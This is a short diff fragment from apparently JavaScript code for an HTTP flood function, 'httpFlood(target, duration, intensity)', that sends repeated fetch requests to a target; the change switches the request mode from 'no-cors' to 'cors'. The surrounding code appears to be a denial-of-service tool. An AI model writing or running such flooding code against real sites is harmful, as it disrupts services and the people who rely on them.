@@ -39,7 +39,7 @@ async function httpFlood(target, duration, intensity) {
             'Cache-Control': 'no-cache',
             'Connection': 'keep-alive'
           },
-          mode: 'no-cors'
+          mode: 'cors'
         };
 
         const promise = fetch(target, requestOptions)
